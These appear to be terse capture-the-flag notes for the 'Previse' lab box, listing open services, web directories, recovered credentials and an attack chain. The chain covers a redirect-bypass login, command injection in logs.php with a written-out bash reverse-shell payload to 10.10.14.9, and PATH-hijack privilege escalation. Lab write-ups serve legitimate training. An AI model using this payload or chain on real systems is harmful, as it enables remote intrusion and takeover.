| HOST | PORT | PROTO | SERVICE | VERSION
| 10.10.11.104 | 22 | tcp | OpenSSH | 7.6p1 Ubuntu 4ubuntu0.3 | 
| 10.10.11.104 | 80 | tcp | Apache httpd | 2.4.29 | 


## HEADERS
---
HTTP/1.1 302 Found
Date: Sun, 09 Jul 2023 17:50:25 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=iemleuslqlacu7c01vvv12cmah; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: login.php
Content-Type: text/html; charset=UTF-8

---

## DIRECTORIES
---
* /login.php
* /js                   [--> http://previse.htb/js/]
* /index.php            [--> login.php]
* /css                  [--> http://previse.htb/css/]
* /download.php         [--> login.php]
* /logout.php           [--> login.php]
* /files.php            [--> login.php]
* /logs.php             [--> login.php]
* /config.php
* /header.php
* /footer.php
* /accounts.php         [--> login.php]
* /nav.php
* /status.php           [--> login.php]

---

## USERS
---
* root mySQL_p@ssw0rd!:) (mysql)
* m4lwhere ilovecody112235!
---

## NOTES
---
* EAR vulnerable
* capture request to http://previse.htb/accounts.php
* forward and change the response header from 302 Found to 200 Ok forward again
* capture account creation request and send it in burp and login
* site backup in files
* `$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");` in logs.php is vulnerable
* capture logs request and change delim parameter to inject a reverse shell into the command `delim=comma%3b+bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.9/2222+0>%261'`
* login to mysql and get password `select TO_BASE64(password) from accounts where id=1;` by converting to b64
* crack it and ssh as m4lwhere
* sudo -l `(root) /opt/scripts/access_backup.sh`
* script is vulnerable to PATH injection through the gzip binary
* create a reverse shell script in a writable directory called `gzip` and `export PATH=.:$PATH`
* run the script as sudo
---
